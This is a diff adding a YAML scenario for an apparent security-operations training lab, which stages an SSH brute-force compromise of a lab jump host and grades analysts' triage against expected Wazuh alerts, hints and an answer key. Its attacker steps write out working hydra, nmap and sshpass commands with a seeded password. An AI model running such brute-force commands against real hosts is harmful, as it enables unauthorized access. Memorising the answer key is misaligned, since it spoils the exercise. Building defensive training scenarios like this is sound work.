@@ -1,0 +1,106 @@
+schema_version: "1.0"
+id: SCN-001
+name: "SSH brute-force alert — vic-jump"
+description: >
+  Wazuh raised an SSH brute-force alert cluster on the jump host
+  vic-jump: a burst of failed authentications against the admin account
+  from a single source, with a successful authentication and follow-on
+  activity in the same window. Triage and disposition.
+author: "Wachturm Contributors"
+created: 2026-05-16
+difficulty: easy
+category: initial_access
+expected_verdict: true_positive
+mitre:
+  - T1110.001
+  - T1078
+duration_minutes: 4
+tags: [ssh, credential-access, beginner]
+
+setup:
+  - actor: vic-jump
+    command: "id admin >/dev/null 2>&1 || (useradd -m -s /bin/bash admin && echo 'admin:Sup3rs3cret!' | chpasswd)"
+    description: "Ensure the target 'admin' account exists with the seeded weak password"
+
+steps:
+  - actor: atk-kali
+    description: "Confirm SSH is reachable on the jump host"
+    command: "nmap -Pn -p 22 10.50.10.30"
+    delay_seconds: 0
+    timeout_seconds: 30
+
+  - actor: atk-kali
+    description: "Brute force SSH as admin (creds are at the end of the seeded easy wordlist)"
+    command: "hydra -l admin -P /opt/wordlists/wachturm-easy.txt -t 4 -f ssh://10.50.10.30"
+    delay_seconds: 8
+    timeout_seconds: 120
+
+  - actor: atk-kali
+    description: "Post-auth reconnaissance over SSH with the cracked credentials"
+    # Trailing `; true`: recon "succeeding" means the attacker got in
+    # and looked around — not that every enumeration probe returned 0.
+    # vic-jump is a minimal host with no `sudo`, so `sudo -l` exits 127;
+    # without the guard that 127 would fail the whole scenario run.
+    command: "sshpass -p 'Sup3rs3cret!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@10.50.10.30 'whoami; id; uname -a; sudo -l 2>/dev/null; true'"
+    delay_seconds: 5
+    timeout_seconds: 30
+
+# Real Wazuh rule IDs observed in the lab (NOT the schema §9 example's
+# 5710 — that rule is for *non-existent* users; admin exists here, so
+# failures decode to 5760/5503 and correlate to 5763 + the 40112
+# "multiple failures followed by a success" compromise signal).
+expected_alerts:
+  - rule_id: 5760
+    description: "sshd: authentication failed"
+    minimum_count: 5
+    timeframe_seconds: 180
+  - rule_id: 5763
+    description: "sshd: brute force trying to get access to the system"
+    minimum_count: 1
+    timeframe_seconds: 180
+  - rule_id: 40112
+    description: "Multiple authentication failures followed by a success"
+    minimum_count: 1
+    timeframe_seconds: 240
+
+expected_observables:
+  - type: ip
+    value: "10.50.10.250"
+  - type: hostname
+    value: "vic-jump"
+  - type: user
+    value: "admin"
+
+hints:
+  - "Look at the source IP for the failed SSH logins on vic-jump. Is the same IP responsible for the eventual success?"
+  - "Walk the alert cluster to its end — does a 'multiple failures followed by a success' correlation fire?"
+  - "Pivot to what happened after the successful login. What commands did the attacker run, and what do they tell you about intent?"
+
+answer_key:
+  verdict: true_positive
+  severity: high
+  confidence: high
+  required_observables:
+    - type: ip
+      value: "10.50.10.250"
+      role: source
+    - type: hostname
+      value: "vic-jump"
+      role: target
+    - type: user
+      value: "admin"
+      role: compromised
+  summary_keywords:
+    - any_of: ["brute force", "brute-force", "password guessing"]
+    - any_of: ["successful login", "compromise", "authenticated"]
+  next_steps:
+    - contain_host
+    - reset_credentials
+    - escalate_t2
+  reasoning: >
+    A sustained burst of failed SSH authentications from a single source
+    IP (10.50.10.250) against the admin account, immediately followed by
+    a successful authentication from that same IP, is a textbook
+    credential brute-force compromise (Wazuh correlates this as rule
+    40112). The subsequent recon (whoami, id, uname, sudo -l) shows the
+    attacker establishing situational awareness with valid credentials.
